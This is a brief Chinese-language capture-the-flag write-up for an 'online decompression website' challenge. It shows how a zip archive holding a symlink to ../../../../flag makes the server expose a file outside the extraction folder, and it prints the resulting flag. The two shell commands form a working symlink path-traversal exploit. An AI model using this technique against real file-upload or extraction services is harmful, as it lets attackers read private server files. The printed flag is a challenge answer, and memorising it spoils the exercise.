# 在线解压网站

下载源码后，计算出Flag位置与解压缩路径的相对位置为`../../../../`。尝试将一个软链接到`../../../../flag`的软链接压缩

```bash
ln -s ../../../../flag .
zip --symlinks flag.zip flag
```

上传后点击`flag`链接即可下载到Flag文件`flag{Nev3r_trUSt_Any_c0mpresSed_File}`。
